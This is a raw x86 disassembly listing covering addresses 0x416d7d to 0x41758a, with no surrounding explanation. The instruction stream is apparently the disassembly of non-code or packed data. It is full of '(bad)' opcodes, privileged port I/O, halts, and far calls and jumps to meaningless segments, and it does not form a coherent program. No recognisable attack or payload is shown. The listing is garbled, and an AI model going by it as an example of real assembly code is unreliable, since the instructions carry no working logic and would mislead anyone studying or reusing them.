  416d7d:	jle    0x416d9f
  416d7f:	out    0xe6,al
  416d81:	mov    esp,0xb34ebd1f
  416d86:	mov    DWORD PTR [edi],eax
  416d88:	and    al,0x42
  416d8a:	pop    eax
  416d8b:	sbb    bh,BYTE PTR [eax]
  416d8d:	or     eax,DWORD PTR [eax]
  416d8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d90:	push   ebx
  416d91:	lea    eax,[edi+0x1ab4c420]
  416d97:	push   esp
  416d98:	lea    edi,[edi+0x6ff42419]
  416d9e:	or     al,al
  416da0:	fdivr  DWORD PTR [ecx-0x97797bc]
  416da6:	push   eax
  416da7:	or     eax,0x2fc4a740
  416dac:	mov    dl,0x70
  416dae:	cs mov esi,0x9570c47c
  416db4:	test   BYTE PTR [esi-0x5b],cl
  416db7:	jecxz  0x416d50
  416db9:	loopne 0x416d42
  416dbb:	ja     0x416d71
  416dbd:	bound  esp,QWORD PTR [eax+0x71]
  416dc0:	jl     0x416dde
  416dc2:	call   0x699:0x9f7d8129
  416dc9:	jecxz  0x416d6e
  416dcb:	or     BYTE PTR ds:0xcd23a877,dh
  416dd1:	cmp    DWORD PTR [esi],esp
  416dd3:	pop    esi
  416dd4:	je     0x416e20
  416dd6:	iret   
  416dd7:	aas    
  416dd8:	sub    eax,0x56e2a746
  416ddd:	cwde   
  416dde:	jne    0x416dab
  416de0:	inc    edx
  416de1:	mov    al,ds:0xc61b2089
  416de6:	mov    eax,0xe56d594d
  416deb:	mov    DWORD PTR [edx+eax*8],0x9d19a217
  416df2:	(bad)  
  416df3:	sub    eax,0xa4e70bf9
  416df8:	inc    ebp
  416df9:	jge    0x416d7c
  416dfb:	cmp    eax,0x93f8badb
  416e00:	xchg   ebp,eax
  416e01:	mov    dh,0xba
  416e03:	xchg   ebp,eax
  416e04:	leave  
  416e05:	mov    eax,0x18776121
  416e0a:	xchg   ebp,eax
  416e0b:	dec    esp
  416e0c:	outs   dx,DWORD PTR ds:[esi]
  416e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e0e:	jnp    0x416de9
  416e10:	(bad)  
  416e12:	repnz or cl,BYTE PTR [edx]
  416e15:	sub    al,BYTE PTR [ebx]
  416e17:	jp     0x416e25
  416e19:	dec    edx
  416e1a:	adc    eax,DWORD PTR [edx+0x1b]
  416e1d:	sbb    ebp,DWORD PTR [ecx+0x5de46081]
  416e23:	scas   al,BYTE PTR es:[edi]
  416e24:	mov    esi,0x3d13157a
  416e29:	dec    ecx
  416e2a:	inc    edi
  416e2b:	add    al,0xe1
  416e2d:	les    edi,FWORD PTR [edx]
  416e2f:	jb     0x416e74
  416e31:	sub    al,0x47
  416e33:	sub    BYTE PTR [eax-0x3c],dl
  416e36:	and    eax,0xb718fdf3
  416e3b:	adc    ecx,DWORD PTR ds:0xe8839d7b
  416e41:	xchg   edi,eax
  416e42:	iret   
  416e43:	test   BYTE PTR [ebx-0x2570ae1e],0x56
  416e4a:	xor    BYTE PTR [esi-0x3f918873],ch
  416e50:	mov    ebx,0x77b2b466
  416e55:	mov    edi,DWORD PTR [edx]
  416e57:	add    ebp,DWORD PTR [edx-0x6a]
  416e5a:	dec    edx
  416e5b:	add    eax,0x127ff06c
  416e60:	aaa    
  416e61:	push   0x1398d39a
  416e66:	dec    edx
  416e67:	rcr    DWORD PTR [eax+0x7d],0x9f
  416e6b:	jg     0x416e3c
  416e6d:	dec    esi
  416e6e:	jmp    DWORD PTR [edi]
  416e70:	sbb    bl,BYTE PTR [ecx+0x3a14a6e2]
  416e76:	ror    BYTE PTR [edx+0x5b69a7d5],cl
  416e7c:	mov    bl,0x42
  416e7e:	ins    DWORD PTR es:[edi],dx
  416e7f:	mov    al,0xde
  416e81:	out    0x97,al
  416e83:	dec    edx
  416e84:	cmp    eax,0xa6564c91
  416e89:	sub    eax,DWORD PTR [ebx+0x4]
  416e8c:	sbb    ch,ch
  416e8e:	sbb    eax,0xff70c2e9
  416e93:	push   ss
  416e94:	test   al,0xc8
  416e96:	arpl   si,bp
  416e98:	xchg   ebp,eax
  416e99:	jp     0x416e61
  416e9b:	push   0xffffffdb
  416e9d:	fbld   TBYTE PTR ds:0x325c7261
  416ea3:	dec    ecx
  416ea4:	inc    esi
  416ea5:	pusha  
  416ea6:	mov    ch,0x67
  416ea8:	adc    al,0xb4
  416eaa:	in     eax,0x12
  416eac:	sbb    edi,DWORD PTR [edx]
  416eae:	jbe    0x416ed2
  416eb0:	adc    edx,DWORD PTR [esi+ebx*8]
  416eb3:	fwait
  416eb4:	popa   
  416eb5:	pop    edx
  416eb6:	xor    edi,DWORD PTR [ebp+0x14]
  416eb9:	sub    DWORD PTR [edi-0x47c71d72],0x79
  416ec0:	sbb    DWORD PTR [edx-0x14ae2894],esi
  416ec6:	cmp    al,0xcd
  416ec8:	das    
  416ec9:	and    BYTE PTR [ebx+ebx*8+0x8],ah
  416ecd:	es leave 
  416ecf:	test   BYTE PTR [edx],0xe1
  416ed2:	loope  0x416eab
  416ed4:	hlt    
  416ed5:	mov    eax,0x162133b3
  416eda:	add    eax,0xd20931a4
  416edf:	xor    eax,0x2c3dbdb
  416ee4:	mov    BYTE PTR [esi-0x1d],ah
  416ee7:	add    eax,DWORD PTR [ecx-0x7]
  416eea:	mov    eax,0x98e8f8b8
  416eef:	sbb    eax,0x5bde7e38
  416ef4:	(bad)  
  416ef5:	inc    ecx
  416ef6:	mov    DWORD PTR [edx-0x36c845bb],esi
  416efc:	nop
  416efd:	add    bh,BYTE PTR [ebp-0x15]
  416f00:	and    BYTE PTR [esi-0x14],al
  416f03:	xchg   bl,ch
  416f05:	mov    al,0xd8
  416f07:	add    eax,0x67bb60d
  416f0c:	stc    
  416f0d:	and    eax,0x2b6be4e4
  416f12:	fiadd  DWORD PTR [eax-0x18]
  416f15:	jb     0x416ece
  416f17:	dec    ebx
  416f18:	sbb    BYTE PTR [ebp+0x6d633a1f],dl
  416f1e:	fsubr  DWORD PTR [edx]
  416f20:	iret   
  416f21:	loope  0x416f8e
  416f23:	push   ds
  416f24:	into   
  416f25:	sub    BYTE PTR [edi+0x1d0e013d],0xeb
  416f2c:	aad    0xd8
  416f2e:	dec    ecx
  416f2f:	push   edx
  416f30:	push   edx
  416f31:	neg    DWORD PTR [ebx]
  416f33:	aaa    
  416f34:	mov    esp,esp
  416f36:	test   BYTE PTR [ecx+ecx*1+0x433b4c08],dl
  416f3d:	loope  0x416f8c
  416f3f:	inc    ebp
  416f40:	xor    dh,BYTE PTR [ecx-0x7e51ea12]
  416f46:	xchg   DWORD PTR [ebp+0x7d],edi
  416f49:	stos   DWORD PTR es:[edi],eax
  416f4a:	pop    ecx
  416f4b:	push   es
  416f4c:	aaa    
  416f4d:	mov    bh,BYTE PTR fs:[ebx-0x1b12c62b]
  416f54:	hlt    
  416f55:	add    ecx,DWORD PTR [ebp+0x1e]
  416f58:	ret    
  416f59:	mov    al,ds:0x7f2bad
  416f5e:	(bad)  
  416f5f:	pusha  
  416f60:	pmaxub mm6,mm4
  416f63:	test   al,0x3a
  416f65:	mov    ds:0x2bd41829,al
  416f6a:	mov    ecx,0xa01dc9bd
  416f6f:	out    0x35,al
  416f71:	sbb    ch,BYTE PTR [ecx+0x28661b85]
  416f77:	pop    es
  416f78:	xor    al,0x4c
  416f7a:	jecxz  0x416f0a
  416f7c:	sbb    eax,0x9b4dba5c
  416f81:	inc    edi
  416f82:	push   ebp
  416f83:	mul    DWORD PTR [esi-0x3a697951]
  416f89:	cs (bad) 
  416f8b:	fmulp  st(0),st
  416f8d:	push   0xd9815bf5
  416f92:	inc    BYTE PTR [ecx]
  416f94:	adc    ebp,DWORD PTR [edx-0x1]
  416f97:	(bad)  
  416f98:	ins    DWORD PTR es:[edi],dx
  416f99:	cmp    al,0x6a
  416f9b:	sbb    BYTE PTR [ecx+ebx*2-0x21],ch
  416f9f:	jp     0x416f5e
  416fa1:	pusha  
  416fa2:	pop    eax
  416fa3:	mov    DWORD PTR [eax+0x5120b74d],edx
  416fa9:	popa   
  416faa:	ins    BYTE PTR es:[edi],dx
  416fab:	std    
  416fac:	mov    DWORD PTR [esi],eax
  416fae:	fs aam 0xcc
  416fb1:	or     BYTE PTR [edx+0x54ab71d],dh
  416fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fb8:	pop    ecx
  416fb9:	sub    edx,DWORD PTR [ecx]
  416fbb:	add    eax,0x83aff9ab
  416fc0:	out    0x64,al
  416fc2:	adc    BYTE PTR [esi-0x2a],dh
  416fc5:	or     eax,0x246f2d02
  416fca:	hlt    
  416fcb:	mov    dh,0x57
  416fcd:	adc    al,0x5d
  416fcf:	add    ebp,DWORD PTR [edi-0x37fa9195]
  416fd5:	jmp    0x870bae19
  416fda:	sbb    cl,bl
  416fdc:	mov    cl,0x3c
  416fde:	mov    ch,0x71
  416fe0:	out    0xdd,al
  416fe2:	pop    eax
  416fe3:	div    dl
  416fe5:	pop    ss
  416fe6:	pop    ebx
  416fe7:	mov    bl,BYTE PTR [edi]
  416fe9:	scas   al,BYTE PTR es:[edi]
  416fea:	xchg   esi,eax
  416feb:	adc    ebx,esp
  416fed:	mov    ah,BYTE PTR [ebx-0x573de2cf]
  416ff3:	dec    ebp
  416ff4:	add    BYTE PTR [ebp+edi*1-0x6a1203ce],ch
  416ffb:	mov    ebp,0xbf69f386
  417000:	pushf  
  417001:	jge    0x417071
  417003:	and    edi,DWORD PTR [esi+0x46ff3ffb]
  417009:	out    dx,eax
  41700a:	scas   eax,DWORD PTR es:[edi]
  41700b:	add    al,0xb0
  41700d:	aam    0xf3
  41700f:	ret    
  417010:	cmp    eax,0x1dc7e618
  417015:	js     0x416fe0
  417017:	outs   dx,DWORD PTR ds:[esi]
  417018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417019:	and    edx,DWORD PTR [ebp-0xb]
  41701c:	add    DWORD PTR ds:0xd7f97c89,eax
  417022:	nop
  417023:	(bad)  [edx+0x3b]
  417026:	or     BYTE PTR [edx+0x3a],al
  417029:	idiv   BYTE PTR [edx+0x7af601f3]
  41702f:	jge    0x416ff4
  417031:	inc    esp
  417032:	imul   esi,DWORD PTR [edx+0x57a0709f],0x540ac9fc
  41703c:	sub    dl,BYTE PTR [eax-0x6547d89c]
  417042:	pop    ebx
  417043:	mov    ebx,0x7577b8fd
  417048:	jnp    0x4170b6
  41704a:	das    
  41704b:	adc    al,BYTE PTR [edx-0x20]
  41704e:	out    dx,eax
  41704f:	cmp    ah,BYTE PTR [ebp-0x19312e23]
  417055:	fmul   QWORD PTR [edx+0x16]
  417058:	in     eax,0x84
  41705a:	pushf  
  41705b:	jo     0x41701f
  41705d:	fldcw  WORD PTR [ebx+0x2d5b602a]
  417063:	retf   
  417064:	or     DWORD PTR [edx+0x380905c5],esp
  41706a:	dec    ebx
  41706b:	jl     0x41704c
  41706d:	xor    ah,BYTE PTR [esi-0x23]
  417070:	jg     0x4170a6
  417072:	inc    esp
  417073:	cmp    eax,0x76d0f91d
  417078:	pop    ss
  417079:	(bad)  
  41707a:	sahf   
  41707b:	sar    BYTE PTR [ecx+0x6ad408fe],cl
  417081:	push   es
  417082:	jmp    0xf776:0xbbf7120c
  417089:	scas   eax,DWORD PTR es:[edi]
  41708a:	ja     0x417034
  41708c:	outs   dx,BYTE PTR ds:[esi]
  41708d:	push   edx
  41708e:	or     cl,BYTE PTR [eax]
  417090:	or     DWORD PTR [eax-0x19],esp
  417093:	in     al,dx
  417094:	or     DWORD PTR ds:0x4d0c5983,0x7bff3b9e
  41709e:	ret    0xb1c6
  4170a1:	xor    ah,BYTE PTR ss:[edx]
  4170a4:	(bad)  
  4170a5:	mov    bh,0x11
  4170a7:	retf   0xa3a4
  4170aa:	mov    ah,0x9f
  4170ac:	lods   al,BYTE PTR ds:[esi]
  4170ad:	mov    DWORD PTR [eax],eax
  4170af:	test   BYTE PTR [edx+ebx*2],0xd2
  4170b3:	cmp    BYTE PTR [ecx+ebp*1+0x794efe37],0x37
  4170bb:	sar    DWORD PTR ds:0xb3f3a77,0xdc
  4170c2:	in     eax,dx
  4170c3:	and    eax,0x310cfb26
  4170c8:	scas   al,BYTE PTR es:[edi]
  4170c9:	xchg   edi,eax
  4170ca:	popf   
  4170cb:	inc    ebx
  4170cc:	dec    edi
  4170cd:	push   0x29
  4170cf:	inc    edi
  4170d0:	pop    ebx
  4170d1:	sub    BYTE PTR [ebx],al
  4170d3:	push   esp
  4170d4:	cmp    eax,0xf2f75f5a
  4170d9:	cs mov bh,0x21
  4170dc:	in     al,0x3
  4170de:	iret   
  4170df:	adc    ecx,ecx
  4170e1:	cwde   
  4170e2:	popa   
  4170e3:	mov    ebp,0x2daeefd7
  4170e8:	cmp    eax,eax
  4170ea:	add    al,0x25
  4170ec:	gs jge 0x417088
  4170ef:	sbb    esi,esp
  4170f1:	mov    edx,0xce06e1ed
  4170f6:	adc    ebx,DWORD PTR [eax+esi*8]
  4170f9:	mov    dl,0x68
  4170fb:	cs push ebp
  4170fd:	loop   0x4170d9
  4170ff:	cdq    
  417100:	je     0x41711c
  417102:	dec    eax
  417103:	jnp    0x417158
  417105:	cdq    
  417106:	sub    eax,0xa764d070
  41710b:	(bad)  
  41710c:	out    0xe2,al
  41710e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41710f:	sbb    al,0xc7
  417111:	pop    edx
  417112:	add    al,cl
  417114:	push   eax
  417115:	les    esi,FWORD PTR [esi+0x1397bf4a]
  41711b:	push   ds
  41711c:	mov    BYTE PTR [ecx+0x78],al
  41711f:	mov    ?,WORD PTR [esi+0x17dc6cf]
  417125:	dec    esp
  417126:	pop    ecx
  417127:	hlt    
  417128:	loope  0x41712b
  41712a:	ds pop ebp
  41712c:	jg     0x41711f
  41712e:	jmp    0x417107
  417130:	add    ebp,edi
  417132:	push   0xffffff9b
  417134:	retf   0xa9ed
  417137:	(bad)
  41713a:	cli    
  41713b:	loope  0x41713e
  41713d:	xchg   ecx,eax
  41713e:	cld    
  41713f:	jg     0x417152
  417141:	sub    ah,BYTE PTR [edi-0x368f9da9]
  417147:	mov    ds:0xeb45731d,eax
  41714c:	mov    ebx,0xb0d4523b
  417151:	xchg   ecx,eax
  417152:	popa   
  417153:	test   BYTE PTR [ecx],al
  417155:	mov    edx,0x4f69735c
  41715a:	pop    es
  41715b:	inc    esp
  41715d:	ret    0x4b39
  417160:	dec    edx
  417161:	mov    edx,0xfde0b7cf
  417166:	(bad)  
  417167:	mov    esi,0xc6a2079e
  41716c:	pop    ebx
  41716d:	sbb    al,0xf1
  41716f:	push   edx
  417170:	push   eax
  417171:	sbb    eax,0xabaccd85
  417176:	test   al,0x7
  417178:	inc    ecx
  417179:	fxch   st(0)
  41717b:	or     dl,BYTE PTR [ebx-0x2]
  41717e:	in     al,0x70
  417180:	ja     0x417151
  417182:	mov    DWORD PTR [ebx],eax
  417184:	push   eax
  417185:	or     al,0x7b
  417187:	fwait
  417188:	cmp    eax,0xe1a6d46c
  41718d:	jmp    0x9e78:0xb2c554f0
  417194:	outs   dx,BYTE PTR ds:[esi]
  417195:	push   ecx
  417196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417197:	ficom  WORD PTR [esi]
  417199:	push   esp
  41719a:	mov    al,0xbf
  41719c:	sahf   
  41719d:	mov    edx,0xb0a7f5c2
  4171a2:	mov    dl,0x50
  4171a4:	add    eax,0xbf880269
  4171a9:	inc    ecx
  4171aa:	xor    ah,BYTE PTR [edx-0x5efca6eb]
  4171b0:	mov    ch,al
  4171b2:	mov    bh,0x7c
  4171b4:	adc    ecx,DWORD PTR [ecx+0x7d]
  4171b7:	stos   BYTE PTR es:[edi],al
  4171b8:	jmp    0xbe27a848
  4171bd:	adc    al,ch
  4171bf:	mov    ebx,0x9e5cd18
  4171c4:	pop    ss
  4171c5:	cdq    
  4171c6:	outs   dx,BYTE PTR ds:[esi]
  4171c7:	mov    ss,edx
  4171c9:	stos   DWORD PTR es:[edi],eax
  4171ca:	ret    
  4171cb:	and    BYTE PTR [esi],dl
  4171cd:	pop    ecx
  4171ce:	jae    0x4171de
  4171d0:	sub    eax,0xd70dbdb7
  4171d5:	add    ah,dh
  4171d7:	cmc    
  4171d8:	mov    eax,0xe3de58c4
  4171dd:	or     DWORD PTR [edx+esi*4-0x196f14d3],edi
  4171e4:	aad    0xac
  4171e6:	outs   dx,BYTE PTR ds:[esi]
  4171e7:	xor    eax,DWORD PTR [ecx]
  4171e9:	das    
  4171ea:	pop    ds
  4171eb:	mov    eax,ds:0x5abf9c3b
  4171f0:	sub    DWORD PTR [edi],esp
  4171f2:	loop   0x417245
  4171f4:	imul   ebx,DWORD PTR ds:0x61a010f2,0x78
  4171fb:	xchg   esp,eax
  4171fc:	and    al,0xe5
  4171fe:	lea    ebx,[eax+ebp*2+0x54]
  417202:	sbb    dh,BYTE PTR [eax+0x6a6d448d]
  417208:	imul   BYTE PTR [edi+0x29bc71f1]
  41720e:	xchg   ecx,eax
  41720f:	rol    DWORD PTR [edi],1
  417211:	mov    esp,0xfd532123
  417216:	cdq    
  417217:	in     eax,dx
  417218:	inc    esi
  417219:	icebp  
  41721a:	and    eax,0x4a43c37e
  41721f:	pop    ss
  417220:	pop    eax
  417221:	mov    bl,0xb4
  417223:	push   ds
  417224:	mov    ?,WORD PTR [edx+0x24890fd7]
  41722a:	ins    BYTE PTR es:[edi],dx
  41722b:	push   ecx
  41722c:	inc    ebx
  41722d:	xor    ebp,edx
  41722f:	xchg   esi,eax
  417230:	adc    eax,0xd1fbdc3d
  417235:	xlat   BYTE PTR ds:[ebx]
  417236:	adc    DWORD PTR [edi],ebx
  417238:	fcomip st,st(3)
  41723a:	cdq    
  41723b:	mov    dl,0xff
  41723d:	mov    ds:0x22c8f2f0,eax
  417242:	retf   
  417243:	xchg   BYTE PTR [ecx+0x7c],dh
  417246:	and    al,0xfa
  417248:	add    eax,0x99d59e8c
  41724d:	add    edi,DWORD PTR [ebp-0x78]
  417250:	mov    ebx,0x10a3250e
  417255:	push   esp
  417256:	out    dx,al
  417257:	xor    cl,BYTE PTR [edi+0x12]
  41725a:	sub    dh,BYTE PTR [edi+0xc]
  41725d:	and    al,BYTE PTR [eax-0x6b5ef870]
  417263:	mov    edx,0xbf727069
  417268:	cdq    
  417269:	popf   
  41726a:	jmp    DWORD PTR ds:0xbe99fa59
  417270:	cwde   
  417271:	mov    al,ds:0xbc0abb9d
  417276:	jbe    0x417244
  417278:	jl     0x417248
  41727a:	sbb    al,0x47
  41727c:	ss loope 0x417240
  41727f:	adc    eax,0x15913c0d
  417285:	dec    ebx
  417286:	sub    DWORD PTR [eax-0x53],ebp
  417289:	outs   dx,DWORD PTR ds:[esi]
  41728a:	cs xchg ecx,eax
  41728c:	add    BYTE PTR [ebp-0x69456d0c],dl
  417292:	cmp    ecx,edi
  417294:	rcl    BYTE PTR [esi+0x44],1
  417297:	cdq    
  417298:	mov    eax,0x28800253
  41729d:	inc    esp
  41729e:	mov    edx,0xc07499ef
  4172a3:	or     BYTE PTR [edi+0x26],bl
  4172a6:	jecxz  0x417270
  4172a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172a9:	cmp    eax,0xe4feebe1
  4172ae:	cdq    
  4172af:	rsqrtps xmm3,xmm5
  4172b2:	(bad)  
  4172b3:	clc    
  4172b4:	rcl    BYTE PTR ds:0x40856d17,1
  4172ba:	retf   0xbb3f
  4172bd:	dec    ecx
  4172be:	fcos   
  4172c1:	shl    DWORD PTR [edx+ecx*8-0x43],cl
  4172c5:	mul    DWORD PTR [ecx+0xc]
  4172c8:	mov    eax,ds:0x5d0d5fbf
  4172cd:	sub    edx,eax
  4172cf:	pushf  
  4172d0:	leave  
  4172d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172d2:	mov    al,0x52
  4172d4:	sbb    cl,BYTE PTR ds:0x532440c0
  4172da:	sub    DWORD PTR ds:0xf449bc2f,esp
  4172e0:	or     DWORD PTR cs:[edx+eiz*1-0x126dda0a],esp
  4172e8:	push   edx
  4172e9:	cld    
  4172ea:	daa    
  4172eb:	jle    0x4172c3
  4172ed:	jl     0x41730d
  4172ef:	adc    eax,0xfc556a78
  4172f4:	adc    BYTE PTR [ebx+0x2bb6119b],dh
  4172fa:	call   0x9bc5:0x19102ab0
  417301:	shl    bl,0x31
  417304:	xor    edi,DWORD PTR [eax-0x52]
  417307:	pop    eax
  417308:	addr16 xchg edi,eax
  41730a:	ja     0x4172c4
  41730c:	pushf  
  41730d:	sbb    al,0x2a
  41730f:	sbb    al,0xb3
  417311:	push   edx
  417312:	or     eax,edi
  417314:	cwde   
  417315:	pop    ebx
  417316:	and    edx,ecx
  417318:	sub    al,0x7
  41731a:	dec    edx
  41731b:	xchg   edi,eax
  41731c:	gs dec ebx
  41731e:	mov    bl,0x27
  417320:	mov    dh,0x94
  417322:	inc    esi
  417323:	sbb    ebp,DWORD PTR [eax-0x3cb2344f]
  417329:	out    dx,al
  41732a:	mov    dh,0x70
  41732c:	cmp    esp,DWORD PTR [esi]
  41732e:	sub    al,0x5c
  417330:	xor    esi,edx
  417332:	adc    dl,dl
  417334:	jle    0x417310
  417336:	cmp    edi,DWORD PTR [eax+0x71c1be52]
  41733c:	xor    DWORD PTR [edx],esp
  41733e:	push   ss
  41733f:	out    0xac,eax
  417341:	repz rol DWORD PTR [edx+0x56],1
  417345:	xchg   ecx,eax
  417346:	xor    DWORD PTR [eax-0x54c1772],ebp
  41734c:	adc    DWORD PTR ds:0x9c096598,esp
  417352:	mov    bl,0x44
  417354:	mov    ds:0xa3501c21,al
  417359:	stos   BYTE PTR es:[edi],al
  41735a:	sti    
  41735b:	add    eax,0x1dfad6f9
  417360:	cmp    eax,0xae669278
  417365:	or     esi,DWORD PTR [ebx]
  417367:	xchg   edi,eax
  417368:	popa   
  417369:	adc    al,0xe
  41736b:	nop
  41736c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41736d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41736e:	aam    0xbe
  417370:	jno    0x4173ec
  417372:	sbb    eax,0x1f00c5a0
  417377:	sub    al,0x64
  417379:	into   
  41737a:	xchg   DWORD PTR [ebx-0xf],eax
  41737d:	push   esp
  41737e:	mov    cs,WORD PTR [ecx]
  417380:	sub    esi,ebx
  417382:	mov    al,0xdb
  417384:	and    BYTE PTR [ecx],0xdd
  417387:	popf   
  417388:	cmp    edi,DWORD PTR [ecx]
  41738a:	fwait
  41738b:	jbe    0x41733b
  41738d:	mov    edi,0x1d4d2c7d
  417392:	xor    eax,0x2b3b39c5
  417397:	sar    DWORD PTR ds:0xcd90522c,1
  41739d:	ret    
  41739e:	bound  ebp,QWORD PTR [ecx-0x1d66099a]
  4173a4:	sbb    BYTE PTR [ecx+esi*4],al
  4173a7:	jmp    0x4b463d5a
  4173ac:	sub    edi,DWORD PTR [ebp-0x33046ce3]
  4173b2:	push   ds
  4173b3:	test   eax,0xf028a576
  4173b8:	(bad)  
  4173b9:	push   0xffffffcf
  4173bb:	push   esp
  4173bc:	add    dh,BYTE PTR [edx-0x35]
  4173bf:	rcl    al,cl
  4173c1:	adc    edi,esp
  4173c3:	sub    BYTE PTR [ebp+0x6f837b4d],0xf8
  4173ca:	jne    0x417435
  4173cc:	imul   ecx,DWORD PTR [edx+0x43d93221],0x5adf3f67
  4173d6:	jg     0x4173cc
  4173d8:	sti    
  4173d9:	call   0x3c8c:0x638e574d
  4173e0:	imul   esp,DWORD PTR [ebp+0x26],0x7131d116
  4173e7:	in     eax,0x59
  4173e9:	jbe    0x4173fb
  4173eb:	mov    ebp,0xab51fbaf
  4173f0:	jg     0x41737a
  4173f2:	pop    ebp
  4173f3:	repz das 
  4173f5:	cmp    al,0xc7
  4173f7:	not    eax
  4173f9:	call   0x7e:0xc1a98669
  417400:	adc    al,0xc5
  417402:	loop   0x4173de
  417404:	inc    ebp
  417405:	test   BYTE PTR [edx+0x61045dce],dl
  41740b:	sub    dl,ch
  41740d:	pop    ss
  41740e:	(bad)  [ebp+0x31]
  417411:	ret    0x4fb5
  417414:	xchg   esp,eax
  417415:	dec    edx
  417416:	pop    edx
  417417:	sar    DWORD PTR [edx-0x73],0xe9
  41741b:	arpl   WORD PTR [edx+0x5af1f47b],si
  417421:	mov    dh,0xab
  417423:	xchg   edi,eax
  417424:	mov    BYTE PTR [esi],al
  417426:	push   ds
  417427:	xchg   esi,eax
  417428:	scas   eax,DWORD PTR es:[edi]
  417429:	cs add al,0xc4
  41742c:	cmp    eax,0x4c1b777e
  417431:	inc    eax
  417432:	mov    DWORD PTR [eax],ecx
  417434:	xchg   BYTE PTR [bx+si],ch
  417437:	fidiv  DWORD PTR [edx-0x80647b0]
  41743d:	jp     0x41748f
  41743f:	into   
  417440:	nop
  417441:	push   edx
  417442:	push   esp
  417443:	repnz dec edi
  417445:	and    BYTE PTR [ebp+0x7f],ah
  417448:	sub    dh,ah
  41744a:	sub    eax,0x283b9666
  41744f:	scas   eax,DWORD PTR es:[edi]
  417450:	call   FWORD PTR [edi+0x5b]
  417453:	xor    BYTE PTR [ebx-0x1a],0xa
  417457:	test   BYTE PTR ds:0x8b70b297,0xc9
  41745e:	jnp    0x417426
  417460:	mov    ecx,0x47c7f45d
  417465:	xchg   esi,eax
  417466:	inc    esp
  417467:	fnstenv [edx-0x4c]
  41746a:	cld    
  41746b:	fcmovb st,st(6)
  41746d:	jb     0x4174d6
  41746f:	dec    eax
  417470:	lods   eax,DWORD PTR ds:[esi]
  417471:	mov    edx,0xea7a3b6d
  417476:	dec    edi
  417477:	or     eax,0x70863f2a
  41747c:	jecxz  0x417413
  41747e:	and    BYTE PTR [edi-0x7f],bh
  417481:	sub    bl,BYTE PTR [ebp-0xb]
  417484:	mov    edx,0x1bd2b0
  417489:	inc    ebp
  41748a:	popf   
  41748b:	xchg   DWORD PTR [esi+0x4d71c8cd],edx
  417491:	xchg   ebp,eax
  417492:	adc    eax,0x80feada9
  417497:	test   al,0x29
  417499:	xchg   esp,eax
  41749a:	adc    eax,0x5e726d33
  41749f:	fcompp 
  4174a1:	or     al,0xad
  4174a3:	fisubr WORD PTR ds:0x775a103a
  4174a9:	mov    eax,0xeacf31d9
  4174ae:	or     al,0xe2
  4174b0:	call   0x7b36:0xbf8b58ae
  4174b7:	pop    esp
  4174b8:	or     cl,BYTE PTR [ebx+eax*4]
  4174bb:	lea    ebx,[ebx+0x22a60361]
  4174c1:	lock loop 0x4174c8
  4174c4:	pop    esp
  4174c5:	and    al,0x64
  4174c7:	std    
  4174c8:	push   esp
  4174c9:	add    DWORD PTR [ecx+0x68a76686],ebx
  4174cf:	xor    dl,ah
  4174d1:	hlt    
  4174d2:	push   ds
  4174d3:	bound  ebp,QWORD PTR [edx-0x45]
  4174d6:	jno    0x4174b3
  4174d8:	or     al,0x51
  4174da:	scas   eax,DWORD PTR es:[edi]
  4174db:	pop    esp
  4174dc:	ins    BYTE PTR es:[edi],dx
  4174dd:	jbe    0x41751e
  4174df:	xchg   DWORD PTR [ecx+0x5b],esp
  4174e2:	jle    0x41752c
  4174e4:	jl     0x41755d
  4174e6:	in     al,dx
  4174e7:	mov    ah,0x1
  4174e9:	push   ebp
  4174ea:	ins    DWORD PTR es:[edi],dx
  4174eb:	fidiv  WORD PTR [eax+ecx*2+0x74752532]
  4174f2:	or     dl,BYTE PTR [eax+0x37]
  4174f5:	inc    ebp
  4174f6:	xchg   eax,ecx
  4174f8:	cmp    BYTE PTR [edi-0x75],bl
  4174fb:	fs arpl dx,bp
  4174fe:	sbb    al,0x6c
  417500:	outs   dx,DWORD PTR ds:[esi]
  417501:	cli    
  417502:	jg     0x4174ac
  417504:	gs inc ebp
  417506:	lods   al,BYTE PTR ds:[esi]
  417507:	mov    bl,0xf2
  417509:	xchg   edi,eax
  41750a:	popf   
  41750b:	xchg   edx,eax
  41750c:	mov    ebx,0x117e48fb
  417511:	push   ds
  417512:	jb     0x417564
  417514:	sbb    eax,0xa2a64431
  417519:	xchg   ebx,eax
  41751a:	pop    edx
  41751b:	loope  0x41754c
  41751d:	mov    WORD PTR [ebx-0x29de9f6e],gs
  417523:	sti    
  417524:	mov    bl,0x6c
  417526:	ror    BYTE PTR [ecx+0x7edf9993],cl
  41752c:	push   0x4a
  41752e:	and    al,0x9b
  417530:	nop
  417531:	jmp    0x3036cfd8
  417536:	enter  0xe72a,0x7b
  41753a:	pusha  
  41753b:	xchg   ebx,eax
  41753c:	sub    esi,eax
  41753e:	enter  0x10f7,0x99
  417542:	mov    ch,0x7d
  417544:	int    0xa4
  417546:	stos   BYTE PTR es:[edi],al
  417547:	mov    edx,0xd329e0bb
  41754c:	sbb    al,0x7d
  41754e:	xor    cl,dh
  417550:	cmp    edx,DWORD PTR [ecx]
  417552:	push   eax
  417553:	xchg   DWORD PTR [ebp+ecx*4-0x37b0466],esp
  41755a:	mov    dl,0xf1
  41755c:	push   ds
  41755d:	pop    ss
  41755e:	nop
  41755f:	mov    ah,0x1c
  417561:	pop    es
  417562:	cwde   
  417563:	fsubrp st(5),st
  417565:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417566:	(bad)  
  417567:	push   eax
  417568:	cmp    al,BYTE PTR [ecx+0x317840ac]
  41756e:	call   0x1f1f:0xb0c2f14d
  417575:	sbb    ch,BYTE PTR [ecx]
  417577:	scas   al,BYTE PTR es:[edi]
  417578:	mov    ch,0x7f
  41757a:	jb     0x4175c5
  41757c:	mov    cl,0xb9
  41757e:	and    dl,BYTE PTR [ecx-0x57]
  417581:	pop    ecx
  417582:	add    DWORD PTR es:0x4132beee,0xffffffb4
  41758a:	dec    esi
